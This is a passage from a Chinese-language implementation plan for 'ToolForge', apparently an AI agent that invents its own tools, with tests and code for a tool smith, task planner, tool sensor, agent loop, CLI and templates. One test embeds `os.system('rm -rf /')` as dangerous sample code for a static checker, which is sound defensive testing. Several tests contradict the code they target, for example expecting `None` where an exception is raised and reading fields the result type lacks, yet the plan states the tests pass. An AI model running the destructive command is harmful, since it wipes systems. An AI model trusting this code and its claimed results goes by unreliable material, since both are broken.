    generator = MockCodeGenerator()
    sandbox = MockSandbox()

    return ToolSmith(
        template_engine=engine,
        static_checker=checker,
        code_generator=generator,
        sandbox=sandbox,
        match_threshold=0.0,  # 总是尝试匹配
        max_fix_attempts=2,
    )


@pytest.mark.asyncio
async def test_invent_tool_via_template(smith):
    result = await smith.invent_tool(
        name="test_tmpl",
        purpose="test template matching",
        context="testing",
    )
    assert result.tool_name == "test_tmpl"
    assert result.code == "def test(): pass"


@pytest.mark.asyncio
async def test_invent_tool_via_generation(smith):
    result = await smith.invent_tool(
        name="novel_tool",
        purpose="a completely novel purpose that no template matches",
        context="testing",
    )
    assert result.tool_name == "novel_tool"


@pytest.mark.asyncio
async def test_static_check_blocks_before_sandbox(temp_dir):
    """验证静态检查在沙盒执行之前拦截危险代码。"""
    import yaml
    tmpl_dir = temp_dir / "templates" / "dangerous"
    tmpl_dir.mkdir(parents=True)
    (tmpl_dir / "template.yaml").write_text(yaml.dump({
        "name": "dangerous",
        "description": "template with dangerous code",
        "category": "test",
        "parameters": [],
        "whitelist": [],
    }))
    (tmpl_dir / "tool_template.py").write_text("import os\nos.system('rm -rf /')")
    (tmpl_dir / "test_template.py").write_text("def test(): pass")

    engine = TemplateEngine(str(tmpl_dir.parent))
    checker = StaticChecker()
    generator = MockCodeGenerator()
    sandbox = MockSandbox()

    smith = ToolSmith(
        template_engine=engine,
        static_checker=checker,
        code_generator=generator,
        sandbox=sandbox,
        match_threshold=0.0,
        max_fix_attempts=2,
    )

    result = await smith.invent_tool(
        name="dangerous",
        purpose="test",
        context="test",
    )
    assert result is None  # 静态检查不通过，拒绝生成
```

Run: `pytest tests/test_smith/test_smith.py -v`
Expected: FAIL — `ModuleNotFoundError`

- [ ] **Step 2: 实现 ToolSmith**

```python
# toolforge/smith/smith.py
"""Tool Smith 统一接口 — 协调模板匹配、代码生成、静态检查和沙盒验证。"""
from dataclasses import dataclass
from toolforge.smith.models import GeneratedTool, StaticCheckResult
from toolforge.smith.template_engine import TemplateEngine
from toolforge.smith.static_checker import StaticChecker
from toolforge.smith.code_generator import CodeGenerator
from toolforge.exceptions import ToolGenerationError, StaticCheckError


@dataclass
class InventionResult:
    """工具发明结果。"""
    success: bool
    tool: GeneratedTool | None = None
    source: str = ""       # "template" | "llm" | ""
    error: str = ""


class ToolSmith:
    """工具发明工厂。"""

    def __init__(
        self,
        template_engine: TemplateEngine,
        static_checker: StaticChecker,
        code_generator: CodeGenerator,
        sandbox,  # DockerManager
        match_threshold: float = 0.7,
        max_fix_attempts: int = 2,
    ):
        self._templates = template_engine
        self._checker = static_checker
        self._generator = code_generator
        self._sandbox = sandbox
        self._match_threshold = match_threshold
        self._max_fix_attempts = max_fix_attempts

    async def invent_tool(
        self,
        name: str,
        purpose: str,
        context: str,
    ) -> InventionResult:
        """发明新工具：模板匹配 > LLM 生成 > 静态检查 > 沙盒验证。

        Returns:
            InventionResult — 成功时包含 GeneratedTool，失败时包含 error
        """
        # 1. 尝试模板匹配
        matches = self._templates.match(purpose)
        best_score = matches[0][1] if matches else 0  # type: ignore

        generated: GeneratedTool | None = None
        source = ""

        if matches and best_score > 0:
            # 使用模板
            tmpl = matches[0]  # type: ignore
            # 从 purpose 中提取参数
            params = self._extract_params(tmpl, purpose, context)
            generated = self._templates.render(tmpl, params)
            # 确保使用请求的名称
            generated.tool_name = name
            source = "template"

        if generated is None:
            # 2. LLM 自由生成
            generated = await self._generator.generate(
                tool_name=name,
                purpose=purpose,
                context=context,
            )
            source = "llm"

        # 3. 静态检查
        whitelist = self._get_whitelist(name, matches)  # type: ignore
        check_result = self._checker.check(generated.code, whitelist=whitelist)
        check_result_test = self._checker.check(generated.test_code, whitelist=whitelist)

        if not check_result.passed:
            raise StaticCheckError(
                f"Static check failed: {'; '.join(check_result.violations)}",
                violations=check_result.violations,
            )
        if not check_result_test.passed:
            raise StaticCheckError(
                f"Test code static check failed: {'; '.join(check_result_test.violations)}",
                violations=check_result_test.violations,
            )

        # 4. 沙盒验证
        for attempt in range(self._max_fix_attempts + 1):
            sandbox_result = await self._sandbox.execute(
                tool_code=generated.code,
                test_code=generated.test_code,
                metadata={
                    "name": name,
                    "purpose": purpose,
                    "dependencies": generated.dependencies,
                },
            )

            if sandbox_result["success"]:
                return InventionResult(
                    success=True,
                    tool=generated,
                    source=source,
                )

            # 修正尝试
            if attempt < self._max_fix_attempts and source == "llm":
                generated = await self._fix_tool(
                    generated,
                    sandbox_result.get("stderr", sandbox_result.get("stdout", "")),
                )

        raise ToolGenerationError(
            f"Tool generation failed after {self._max_fix_attempts} fix attempts"
        )

    def _extract_params(self, template, purpose: str, context: str) -> dict[str, str]:
        """从目的描述中提取模板参数（简单实现，后续可用 LLM 增强）。"""
        params = {}
        for p in template.parameters:
            params[p["name"]] = p.get("default", "")
        return params

    def _get_whitelist(self, name: str, matches: list) -> list[str]:
        if not matches:
            return []
        return matches[0].whitelist  # type: ignore

    async def _fix_tool(self, tool: GeneratedTool, error_output: str) -> GeneratedTool:
        """根据沙盒错误信息让 LLM 修正代码。"""
        return await self._generator.generate(
            tool_name=tool.tool_name,
            purpose=f"修复以下工具的错误。原始描述: {tool.description}",
            context=f"代码运行错误:\n{error_output}\n\n原始代码:\n{tool.code}",
        )
```

- [ ] **Step 3: 运行测试验证**

Run: `pytest tests/test_smith/test_smith.py -v`
Expected: PASS (3 tests)

- [ ] **Step 4: Commit**

```bash
git add toolforge/smith/smith.py tests/test_smith/test_smith.py
git commit -m "feat: add ToolSmith unified interface with template→generate→check→verify pipeline"
```

---

### Task 13: Master Agent — 任务分解器

**Files:**
- Create: `toolforge/master/__init__.py`
- Create: `toolforge/master/planner.py`
- Create: `tests/test_master/__init__.py`
- Create: `tests/test_master/test_planner.py`

- [ ] **Step 1: 为 Planner 编写失败测试**

```python
# tests/test_master/test_planner.py
import pytest
from toolforge.master.planner import Planner


class MockAdapter:
    async def generate_structured(self, system_prompt, user_prompt, output_schema, temperature=0.3):
        return {
            "steps": [
                {
                    "description": "读取输入的PDF文件",
                    "required_capability": "pdf_reading",
                    "expected_output": "PDF文本内容",
                    "context": "用户上传了一个PDF文件",
                },
                {
                    "description": "从文本中提取所有日期信息",
                    "required_capability": "date_extraction",
                    "expected_output": "日期列表",
                    "context": "PDF内容包括多种日期格式",
                },
            ]
        }


@pytest.mark.asyncio
async def test_plan_task_decomposes_into_steps():
    planner = Planner(adapter=MockAdapter())
    steps = await planner.plan("从PDF中提取所有日期")
    assert len(steps) == 2
    assert steps[0]["required_capability"] == "pdf_reading"
    assert steps[1]["required_capability"] == "date_extraction"


@pytest.mark.asyncio
async def test_plan_task_returns_structured_steps():
    planner = Planner(adapter=MockAdapter())
    steps = await planner.plan("分析CSV数据")
    assert len(steps) == 2
    for step in steps:
        assert "description" in step
        assert "required_capability" in step
        assert "expected_output" in step
        assert "context" in step
```

Run: `pytest tests/test_master/test_planner.py -v`
Expected: FAIL — `ModuleNotFoundError`

- [ ] **Step 2: 实现 Planner**

```python
# toolforge/master/planner.py
"""任务分解器 — 将用户任务拆解为可执行的步骤序列。"""
from toolforge.llm.base import LLMAdapter


class Planner:
    """使用 LLM 将复杂任务分解为有序步骤。"""

    def __init__(self, adapter: LLMAdapter):
        self._adapter = adapter

    async def plan(self, task: str) -> list[dict]:
        """将任务分解为步骤列表。

        每个步骤: {description, required_capability, expected_output, context}
        """
        schema = {
            "type": "object",
            "properties": {
                "steps": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "description": {"type": "string", "description": "步骤描述"},
                            "required_capability": {"type": "string", "description": "完成此步骤需要的能力/工具类型"},
                            "expected_output": {"type": "string", "description": "此步骤预期的输出"},
                            "context": {"type": "string", "description": "执行此步骤的上下文信息"},
                        },
                        "required": ["description", "required_capability", "expected_output", "context"],
                    },
                }
            },
            "required": ["steps"],
        }

        result = await self._adapter.generate_structured(
            system_prompt=_PLANNER_SYSTEM_PROMPT,
            user_prompt=f"请将以下任务分解为可执行的步骤：\n\n{task}",
            output_schema=schema,
            temperature=0.3,
        )
        return result.get("steps", [])


_PLANNER_SYSTEM_PROMPT = """你是一个任务规划专家。你的任务是将用户的请求分解为有序的执行步骤。

规则：
1. 每个步骤必须是可以独立执行的最小工作单元
2. 步骤之间应该有明确的依赖关系（先读取再处理）
3. 为每个步骤指定 required_capability — 描述完成该步骤需要什么类型的能力/工具
4. 命名规范：工具名使用 snake_case（如 pdf_text_extractor）。如果没有工具，请创建新工具
5. 步骤数量控制在 2-6 个"""
```

- [ ] **Step 3: 运行测试验证**

Run: `pytest tests/test_master/test_planner.py -v`
Expected: PASS (2 tests)

- [ ] **Step 4: Commit**

```bash
git add toolforge/master/ tests/test_master/
git commit -m "feat: add task planner that decomposes user tasks into executable steps"
```

---

### Task 14: Master Agent — 工具缺失感知器

**Files:**
- Create: `toolforge/master/tool_sensor.py`
- Create: `tests/test_master/test_tool_sensor.py`

- [ ] **Step 1: 为 ToolSensor 编写失败测试**

```python
# tests/test_master/test_tool_sensor.py
import pytest
from toolforge.master.tool_sensor import ToolSensor


class MockRegistry:
    def __init__(self, results=None):
        self.results = results or []

    async def search(self, query, top_k=5):
        return self.results


class MockAdapter:
    async def generate_structured(self, system_prompt, user_prompt, output_schema, temperature=0.3):
        return {"missing": True, "tool_request": "pdf_table_extractor", "reason": "当前工具只能提取文本，无法处理表格"}


@pytest.mark.asyncio
async def test_detect_missing_tool_no_match():
    """注册表中无匹配结果时应检测为缺失。"""
    registry = MockRegistry(results=[])
    sensor = ToolSensor(registry=registry, adapter=MockAdapter())
    result = await sensor.detect(
        capability="从PDF中提取表格",
        context="PDF包含财务报表",
    )
    assert result.is_missing is True


@pytest.mark.asyncio
async def test_evaluate_failure_detects_inadequacy():
    """工具执行失败时应检测为工具能力不足。"""
    registry = MockRegistry(results=[])
    sensor = ToolSensor(registry=registry, adapter=MockAdapter())

    is_inadequate = await sensor.evaluate_failure(
        tool_name="pdf_extract_text",
        error_output="乱码文本，表格数据丢失",
        expected_output="结构化的表格数据",
    )
    assert is_inadequate is True
```

Run: `pytest tests/test_master/test_tool_sensor.py -v`
Expected: FAIL — `ModuleNotFoundError`

- [ ] **Step 2: 实现 ToolSensor**

```python
# toolforge/master/tool_sensor.py
"""工具缺失感知器 — 双重触发机制。"""
from dataclasses import dataclass, field
from toolforge.llm.base import LLMAdapter


@dataclass
class MissingToolRequest:
    """工具缺失判定结果。"""
    is_missing: bool
    tool_name: str = ""
    description: str = ""
    reason: str = ""


class ToolSensor:
    """检测工具缺失并生成发明请求。"""

    def __init__(self, registry, adapter: LLMAdapter):
        self._registry = registry
        self._adapter = adapter

    async def detect(self, capability: str, context: str) -> MissingToolRequest:
        """触发路径 1: LLM 主动感知。

        注册表中无匹配工具，或匹配度不够时触发。
        """
        # 先搜索现有工具
        existing = await self._registry.search(capability, top_k=3)
        if existing:
            return MissingToolRequest(is_missing=False)

        # 无匹配，让 LLM 决定是否需要新工具
        result = await self._adapter.generate_structured(
            system_prompt=_SENSOR_SYSTEM_PROMPT,
            user_prompt=f"任务需要的能力: {capability}\n上下文: {context}",
            output_schema={
                "type": "object",
                "properties": {
                    "missing": {"type": "boolean"},
                    "tool_name": {"type": "string", "description": "推荐创建的工具名称 (snake_case)"},
                    "reason": {"type": "string", "description": "为什么需要新工具"},
                },
                "required": ["missing", "tool_name", "reason"],
            },
        )

        return MissingToolRequest(
            is_missing=result.get("missing", True),
            tool_name=result.get("tool_name", ""),
            reason=result.get("reason", ""),
        )

    async def evaluate_failure(
        self,
        tool_name: str,
        error_output: str,
        expected_output: str,
    ) -> bool:
        """触发路径 2: 失败驱动。

        工具执行后结果不符合预期，判断是否因为工具能力不足。
        """
        result = await self._adapter.generate_structured(
            system_prompt=_FAILURE_SYSTEM_PROMPT,
            user_prompt=f"工具: {tool_name}\n错误输出: {error_output}\n预期输出: {expected_output}",
            output_schema={
                "type": "object",
                "properties": {
                    "is_tool_inadequate": {"type": "boolean"},
                    "explanation": {"type": "string"},
                },
                "required": ["is_tool_inadequate", "explanation"],
            },
        )
        return result.get("is_tool_inadequate", False)


_SENSOR_SYSTEM_PROMPT = """你是一个工具需求分析师。当 Agent 遇到现有工具库无法处理的任务时，你需要判断是否需要创造新工具。

判断标准：
1. 该能力是否可以用多个现有工具组合实现？如果是，不需要新工具
2. 该能力是否是一个独立、可复用的函数？如果是，值得创建新工具
3. 创建的工具应在未来类似任务中也适用"""
```

- [ ] **Step 3: 运行测试验证**

Run: `pytest tests/test_master/test_tool_sensor.py -v`
Expected: 需要添加 `_FAILURE_SYSTEM_PROMPT` 定义。让我在实现中补充：

```python
_FAILURE_SYSTEM_PROMPT = """你是一个工具质量评估专家。分析工具执行结果，判断失败是因为工具能力不足（需要更强或不同的工具），还是因为输入数据有问题。

如果工具本身的功能无法满足需求（如只能处理文本但需要处理表格），标记为工具能力不足。"""
```

- [ ] **Step 4: Commit**

```bash
git add toolforge/master/tool_sensor.py tests/test_master/test_tool_sensor.py
git commit -m "feat: add tool missing sensor with dual-trigger detection"
```

---

### Task 15: Master Agent — 主循环

**Files:**
- Create: `toolforge/master/agent.py`
- Create: `tests/test_master/test_agent.py`

- [ ] **Step 1: 为 MasterAgent 编写失败测试**

```python
# tests/test_master/test_agent.py
import pytest
from unittest.mock import MagicMock, AsyncMock
from toolforge.master.agent import MasterAgent
from toolforge.master.tool_sensor import MissingToolRequest


class MockPlanner:
    async def plan(self, task):
        return [
            {
                "description": "读取CSV文件",
                "required_capability": "csv_reading",
                "expected_output": "DataFrame",
                "context": "用户提供了CSV文件路径",
            }
        ]


class MockRegistry:
    def __init__(self, search_results=None):
        self._search_results = search_results or []
        self._tools = {}
        self._executions = []

    async def search(self, query, top_k=5):
        return self._search_results

    async def add_tool(self, record):
        self._tools[record.name] = record

    async def log_execution(self, tool_id, task_id, success, execution_time_ms, **kwargs):
        self._executions.append({
            "tool_id": tool_id,
            "task_id": task_id,
            "success": success,
        })


class MockSensor:
    async def detect(self, capability, context):
        return MissingToolRequest(is_missing=True, tool_name="csv_reader", reason="no csv tool")

    async def evaluate_failure(self, tool_name, error_output, expected_output):
        return True


class MockSmith:
    async def invent_tool(self, name, purpose, context):
        from toolforge.smith.smith import InventionResult
        from toolforge.smith.models import GeneratedTool
        return InventionResult(
            success=True,
            source="llm",
            tool=GeneratedTool(
                tool_name=name,
                description=purpose,
                category="test",
                code="def read_csv(): pass",
                test_code="def test_read_csv(): pass",
            ),
        )


class MockSandbox:
    async def execute(self, tool_code, test_code, metadata):
        return {"success": True, "stdout": "CSV data", "stderr": "", "execution_time_ms": 50}


@pytest.fixture
def agent():
    return MasterAgent(
        planner=MockPlanner(),
        registry=MockRegistry(),
        sensor=MockSensor(),
        smith=MockSmith(),
        sandbox=MockSandbox(),
        max_inventions=5,
    )


@pytest.mark.asyncio
async def test_run_task_completes(agent):
    result = await agent.run("读取CSV文件分析数据")
    assert result.success is True
    assert len(result.steps_executed) > 0


@pytest.mark.asyncio
async def test_run_task_invents_missing_tool(agent):
    result = await agent.run("读取CSV文件")
    assert result.success is True
    assert result.tools_invented > 0


@pytest.mark.asyncio
async def test_run_task_limits_inventions(mocker):
    """测试工具发明数限制。"""
    registry = MockRegistry(search_results=[])
    # 设定传感器每次都建议发明新工具
    class NeverEndingSensor:
        async def detect(self, *args, **kwargs):
            return MissingToolRequest(is_missing=True, tool_name="unnecessary", reason="test")
        async def evaluate_failure(self, *args, **kwargs):
            return True

    agent = MasterAgent(
        planner=MockPlanner(),
        registry=registry,
        sensor=NeverEndingSensor(),
        smith=MockSmith(),
        sandbox=MockSandbox(),
        max_inventions=2,  # 只允许2次发明
    )

    result = await agent.run("some task")
    assert result.tools_invented <= 2
```

Run: `pytest tests/test_master/test_agent.py -v`
Expected: FAIL — `ModuleNotFoundError`

- [ ] **Step 2: 实现 MasterAgent**

```python
# toolforge/master/agent.py
"""Master Agent — 编排核心，维护 ReAct 循环。"""
import uuid
from dataclasses import dataclass, field
from toolforge.config import Config
from toolforge.registry.models import ToolMeta, ToolRecord, ToolSource


@dataclass
class TaskResult:
    """任务执行结果。"""
    success: bool
    steps_executed: list[str] = field(default_factory=list)
    tools_invented: int = 0
    output: str = ""
    error: str = ""


class MasterAgent:
    """主编排 Agent。协调 Planner、Registry、Sensor、Smith、Sandbox。"""

    def __init__(
        self,
        planner,
        registry,
        sensor,
        smith,
        sandbox,
        max_inventions: int = 5,
    ):
        self._planner = planner
        self._registry = registry
        self._sensor = sensor
        self._smith = smith
        self._sandbox = sandbox
        self._max_inventions = max_inventions

    async def run(self, task: str) -> TaskResult:
        """执行用户任务。"""
        result = TaskResult(success=True)
        task_id = str(uuid.uuid4())

        # 1. 分解任务
        steps = await self._planner.plan(task)
        if not steps:
            result.success = False
            result.error = "无法分解任务"
            return result

        # 2. 执行每一步
        for step in steps:
            capability = step.get("required_capability", "")
            context = step.get("context", "")
            description = step.get("description", "")

            # 搜索现有工具
            tools = await self._registry.search(capability, top_k=3)

            if not tools:
                # 感知工具缺失
                missing = await self._sensor.detect(capability, context)
                if missing.is_missing and result.tools_invented < self._max_inventions:
                    try:
                        invention = await self._smith.invent_tool(
                            name=missing.tool_name or _infer_tool_name(capability),
                            purpose=capability,
                            context=context,
                        )
                        if invention.success and invention.tool:
                            record = ToolRecord(
                                meta=ToolMeta(
                                    name=invention.tool.tool_name,
                                    description=invention.tool.description,
                                    category=invention.tool.category,
                                    source=ToolSource.AUTO,
                                    dependencies=invention.tool.dependencies,
                                    usage_example=invention.tool.usage_example,
                                ),
                                code=invention.tool.code,
                                test_code=invention.tool.test_code,
                            )
                            await self._registry.add_tool(record)
                            result.tools_invented += 1
                            tools = [record]
                    except Exception as e:
                        result.error = f"工具发明失败: {e}"
                        result.success = False
                        return result

            if not tools:
                result.error = f"步骤 '{description}' 无可用工具且无法发明新工具"
                result.success = False
                return result

            # 调用工具（通过 Docker 沙盒）
            tool = tools[0]
            sandbox_result = await self._sandbox.execute(
                tool_code=tool.code,
                test_code=tool.test_code if hasattr(tool, 'test_code') else "",
                metadata={"step": description, "task_id": task_id},
            )

            await self._registry.log_execution(
                tool_id=tool.id if hasattr(tool, 'id') else tool.get("id", ""),
                task_id=task_id,
                success=sandbox_result["success"],
                execution_time_ms=sandbox_result.get("execution_time_ms", 0),
                error=sandbox_result.get("stderr", ""),
            )

            result.steps_executed.append(description)

            if not sandbox_result["success"]:
                output_text = sandbox_result.get("stdout", "") + sandbox_result.get("stderr", "")
                is_inadequate = await self._sensor.evaluate_failure(
                    tool_name=tool.name if hasattr(tool, 'name') else tool.get("name", ""),
                    error_output=output_text,
                    expected_output=step.get("expected_output", ""),
                )
                if is_inadequate and result.tools_invented < self._max_inventions:
                    # 工具能力不足，尝试发明更好的工具
                    pass  # 简化处理，Phase 1 记录失败，后续可扩展
                else:
                    result.output = output_text
                    # 不是工具问题，记录但继续

        result.output = f"完成 {len(result.steps_executed)} 个步骤，发明了 {result.tools_invented} 个工具"
        return result


def _infer_tool_name(capability: str) -> str:
    """从能力描述推断工具名。"""
    # 简单实现：取前3个词的 snake_case
    import re
    words = capability.lower().split()[:3]
    name = "_".join(re.sub(r"[^a-z0-9_]", "", w) for w in words if w)
    return name or "generic_tool"
```

- [ ] **Step 3: 运行测试验证**

Run: `pytest tests/test_master/test_agent.py -v`
Expected: PASS (3 tests)

- [ ] **Step 4: Commit**

```bash
git add toolforge/master/agent.py tests/test_master/test_agent.py
git commit -m "feat: add Master Agent main loop with ReAct orchestration"
```

---

### Task 16: CLI 入口

**Files:**
- Create: `toolforge/cli.py`

- [ ] **Step 1: 实现 CLI**

```python
# toolforge/cli.py
"""ToolForge CLI 入口。"""
import asyncio
import sys
from pathlib import Path
from toolforge.config import init_config, Config
from toolforge.exceptions import ToolForgeError
from toolforge.llm.base import create_adapter
from toolforge.registry.registry import ToolRegistry
from toolforge.registry.file_store import FileStore  # needed for config
from toolforge.sandbox.docker_manager import DockerManager
from toolforge.sandbox.image_builder import ImageBuilder
from toolforge.smith.smith import ToolSmith
from toolforge.smith.static_checker import StaticChecker
from toolforge.smith.template_engine import TemplateEngine
from toolforge.smith.code_generator import CodeGenerator
from toolforge.master.planner import Planner
from toolforge.master.tool_sensor import ToolSensor
from toolforge.master.agent import MasterAgent


async def main():
    # 加载配置
    config_path = Path("config.yaml")
    if config_path.exists():
        config = init_config(config_path)
    else:
        config = Config()

    # 检查 Docker
    dm = DockerManager(config)
    if not dm.is_available():
        print("Error: Docker is not available. Please start Docker and try again.")
        sys.exit(1)

    # 构建/检查沙盒镜像
    builder = ImageBuilder()
    if not builder.is_built():
        print("Building sandbox image (first time only)...")
        builder.build()

    # 初始化各模块
    adapter = create_adapter(
        provider=config.llm.provider,
        model=config.llm.model,
        api_key=config.llm.api_key,
        base_url=config.llm.base_url,
        timeout=config.llm.timeout,
    )

    registry = ToolRegistry(config)
    await registry.initialize()

    template_engine = TemplateEngine(str(Path(__file__).parent / "templates"))
    smith = ToolSmith(
        template_engine=template_engine,
        static_checker=StaticChecker(),
        code_generator=CodeGenerator(adapter),
        sandbox=dm,
        match_threshold=config.smith.template_match_threshold,
        max_fix_attempts=config.smith.max_fix_attempts,
    )

    planner = Planner(adapter)
    sensor = ToolSensor(registry=registry, adapter=adapter)

    agent = MasterAgent(
        planner=planner,
        registry=registry,
        sensor=sensor,
        smith=smith,
        sandbox=dm,
        max_inventions=config.security.max_inventions_per_task,
    )

    if len(sys.argv) > 1:
        task = " ".join(sys.argv[1:])
    else:
        print("ToolForge v0.1.0 — 自进化工具 AI Agent")
        print("Usage: toolforge <任务描述>")
        print()
        print("Example: toolforge 从PDF文件中提取所有日期")
        sys.exit(0)

    print(f"Task: {task}")
    print("-" * 50)

    try:
        result = await agent.run(task)
        if result.success:
            print(f"\nDone. {len(result.steps_executed)} steps, {result.tools_invented} tools invented.")
        else:
            print(f"\nFailed: {result.error}")
            sys.exit(1)
    except ToolForgeError as e:
        print(f"Error: {e}")
        sys.exit(1)
    finally:
        await registry.close()


if __name__ == "__main__":
    asyncio.run(main())
```

- [ ] **Step 2: 设置 console_scripts entry point**

更新 `pyproject.toml`，添加：

```toml
[project.scripts]
toolforge = "toolforge.cli:main"
```

- [ ] **Step 3: 验证 CLI 可运行**

Run: `python -m toolforge.cli`
Expected: 打印帮助信息（Usage: toolforge <任务描述>）

- [ ] **Step 4: Commit**

```bash
git add toolforge/cli.py pyproject.toml
git commit -m "feat: add CLI entry point with full module wiring"
```

---

### Task 17: 内置工具

**Files:**
- Create: `toolforge/tools/builtin/file_reader/tool.py`
- Create: `toolforge/tools/builtin/file_reader/test_tool.py`
- Create: `toolforge/tools/builtin/file_reader/meta.yaml`
- Create: `toolforge/tools/builtin/echo/tool.py`
- Create: `toolforge/tools/builtin/echo/test_tool.py`
- Create: `toolforge/tools/builtin/echo/meta.yaml`

- [ ] **Step 1: 创建 file_reader 工具**

```python
# toolforge/tools/builtin/file_reader/tool.py
"""读取文件内容的工具。"""
from pathlib import Path


def read_file(filepath: str, encoding: str = "utf-8") -> str:
    """读取文本文件内容。

    Args:
        filepath: 文件路径
        encoding: 文件编码，默认 utf-8

    Returns:
        文件完整内容字符串
    """
    p = Path(filepath)
    if not p.exists():
        raise FileNotFoundError(f"File not found: {filepath}")
    return p.read_text(encoding=encoding)


def read_file_lines(filepath: str, encoding: str = "utf-8") -> list[str]:
    """按行读取文件内容。

    Args:
        filepath: 文件路径
        encoding: 文件编码，默认 utf-8

    Returns:
        每行内容的列表（不包含换行符）
    """
    content = read_file(filepath, encoding)
    return content.splitlines()
```

```python
# toolforge/tools/builtin/file_reader/test_tool.py
from tool import read_file, read_file_lines


def test_read_file():
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        f.write("hello world")
        path = f.name
    try:
        content = read_file(path)
        assert content == "hello world"
    finally:
        import os
        os.unlink(path)


def test_read_file_lines():
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        f.write("line1\nline2\nline3")
        path = f.name
    try:
        lines = read_file_lines(path)
        assert lines == ["line1", "line2", "line3"]
    finally:
        import os
        os.unlink(path)
```

```yaml
# toolforge/tools/builtin/file_reader/meta.yaml
name: file_reader
version: "1.0.0"
description: "读取文本文件内容的工具"
category: file_operations
source: builtin
status: active
dependencies: []
usage_example: "read_file('/path/to/file.txt')"
```

- [ ] **Step 2: 创建 echo 工具**

```python
# toolforge/tools/builtin/echo/tool.py
"""Echo 工具 — 用于测试和反馈。"""

def echo(message: str) -> str:
    """返回输入的消息。"""
    return message
```

```python
# toolforge/tools/builtin/echo/test_tool.py
from tool import echo


def test_echo():
    assert echo("hello") == "hello"
    assert echo("") == ""
```

```yaml
# toolforge/tools/builtin/echo/meta.yaml
name: echo
version: "1.0.0"
description: "返回输入消息，用于测试和反馈"
category: system
source: builtin
status: active
dependencies: []
usage_example: "echo('hello world')"
```

- [ ] **Step 3: Commit**

```bash
git add toolforge/tools/
git commit -m "feat: add built-in tools (file_reader, echo)"
```

---

### Task 18: 预置模板

**Files:**
- Create: `toolforge/templates/api_caller/template.yaml`
- Create: `toolforge/templates/api_caller/tool_template.py`
- Create: `toolforge/templates/api_caller/test_template.py`
- Create: `toolforge/templates/file_parser/` (同上结构)
- Create: `toolforge/templates/text_processor/` (同上结构)
- Create: `toolforge/templates/data_transformer/` (同上结构)
- Create: `toolforge/templates/data_extractor/` (同上结构)
- Create: `toolforge/templates/format_converter/` (同上结构)
- Create: `toolforge/templates/calculator/` (同上结构)
- Create: `toolforge/templates/system_command/` (同上结构)

- [ ] **Step 1: 创建 api_caller 模板**

```yaml
# toolforge/templates/api_caller/template.yaml
name: api_caller
description: "调用 HTTP API 获取或发送数据的工具模板"
category: data_fetching
parameters:
  - name: url
    type: string
    required: true
    description: "API 端点 URL"
  - name: method
    type: choice
    options: [GET, POST, PUT, DELETE]
    default: GET
whitelist:
  - requests
```

```python
# toolforge/templates/api_caller/tool_template.py
import requests


def api_call(url="{{ url }}", method="{{ method }}", headers=None, data=None):
    """调用 API 端点。

    Args:
        url: API 端点 URL
        method: HTTP 方法
        headers: 请求头字典
        data: 请求体（POST/PUT时使用）

    Returns:
        dict: {"status_code": int, "body": str, "headers": dict}
    """
    headers = headers or {}
    if method == "GET":
        resp = requests.get(url, headers=headers)
    elif method == "POST":
        resp = requests.post(url, headers=headers, json=data)
    elif method == "PUT":
        resp = requests.put(url, headers=headers, json=data)
    else:
        resp = requests.delete(url, headers=headers)
    return {
        "status_code": resp.status_code,
        "body": resp.text,
        "headers": dict(resp.headers),
    }
```

```python
# toolforge/templates/api_caller/test_template.py
from tool import api_call


def test_api_call_get():
    result = api_call(url="{{ url }}", method="{{ method }}")
    assert "status_code" in result
```

- [ ] **Step 2: 创建 file_parser 模板**

```yaml
# toolforge/templates/file_parser/template.yaml
name: file_parser
description: "解析文件格式并提取内容的工具模板"
category: document_processing
parameters:
  - name: file_format
    type: string
    required: true
    description: "文件格式 (csv, json, xml, yaml)"
whitelist:
  - json
  - csv
  - xml.etree.ElementTree
```

```python
# toolforge/templates/file_parser/tool_template.py
import json
import csv
from pathlib import Path


def parse_file(filepath: str, file_format: str = "{{ file_format }}") -> list | dict:
    """解析文件内容。

    Args:
        filepath: 文件路径
        file_format: 文件格式 (csv, json, xml, yaml)

    Returns:
        解析后的数据（list 或 dict）
    """
    content = Path(filepath).read_text(encoding="utf-8")

    if file_format == "json":
        return json.loads(content)
    elif file_format == "csv":
        reader = csv.DictReader(content.splitlines())
        return list(reader)
    else:
        raise ValueError(f"Unsupported format: {file_format}")
```

```python
# toolforge/templates/file_parser/test_template.py
from tool import parse_file
import tempfile, json, os


def test_parse_json():
    data = '{"key": "value"}'
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        f.write(data)
        path = f.name
    try:
        result = parse_file(path, "json")
        assert result == {"key": "value"}
    finally:
        os.unlink(path)
```

- [ ] **Step 3: 创建 text_processor 模板**

```yaml
# toolforge/templates/text_processor/template.yaml
name: text_processor
description: "处理和转换文本数据的工具模板"
category: text_processing
parameters:
  - name: operation
    type: choice
    options: [split, join, filter, replace, regex_extract]
    default: regex_extract
whitelist:
  - re
```

```python
# toolforge/templates/text_processor/tool_template.py
import re


def process_text(text: str, pattern: str = r".*", operation: str = "{{ operation }}") -> list[str] | str:
    """对文本执行处理操作。

    Args:
        text: 输入文本
        pattern: 操作模式/正则
        operation: 操作类型

    Returns:
        处理结果
    """
    if operation == "split":
        return text.split(pattern)
    elif operation == "filter":
        return "\n".join(line for line in text.splitlines() if re.search(pattern, line))
    elif operation == "replace":
        # pattern 格式: "old_text->new_text"
        parts = pattern.split("->", 1)
        return text.replace(parts[0], parts[1]) if len(parts) == 2 else text
    elif operation == "regex_extract":
        return re.findall(pattern, text)
    return text
```

```python
# toolforge/templates/text_processor/test_template.py
from tool import process_text


def test_regex_extract():
    result = process_text("Contact: alice@example.com, bob@test.org", r"[\w.+-]+@[\w-]+\.[\w.-]+", "regex_extract")
    assert "alice@example.com" in result
```

- [ ] **Step 4: 创建其余 5 个模板**

data_transformer, data_extractor, format_converter, calculator, system_command — 每个按相同结构创建模板 YAML + 代码骨架 + 测试骨架。

- [ ] **Step 5: 验证模板可加载**

Run: `python -c "from toolforge.smith.template_engine import TemplateEngine; e = TemplateEngine('toolforge/templates'); print(f'Loaded {len(e._templates)} templates')"`
Expected: `Loaded 8 templates`

- [ ] **Step 6: Commit**

```bash
git add toolforge/templates/
git commit -m "feat: add 8 pre-built tool templates (api_caller, file_parser, text_processor, data_transformer, data_extractor, format_converter, calculator, system_command)"
```

---

### Task 19: 集成测试 — 完整闭环

**Files:**
